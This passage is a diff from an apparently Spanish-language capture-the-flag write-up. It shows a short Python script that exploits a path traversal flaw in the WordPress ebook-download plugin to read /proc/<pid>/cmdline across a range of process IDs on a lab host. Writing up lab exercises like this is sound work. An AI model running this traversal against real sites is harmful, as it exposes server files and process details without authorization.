@@ -113,9 +113,9 @@ Sabiendo esto podemos programar un script en python que ejecute un ataque de fue
 import requests
 
 for i in range(800,1000):
-    url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/" + str(i) + "/cmdline"
-    r = requests.get(url)
-    print(r.content)
+    url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/" + str(i) + "/cmdline"
+    r = requests.get(url)
+    print(r.content)
 ```
 
 El script se podría mejorar filtrando las respuestas que tengan más de un determinado número de bytes para no hacer print de las respuestas que no nos devuelvan nada útil.
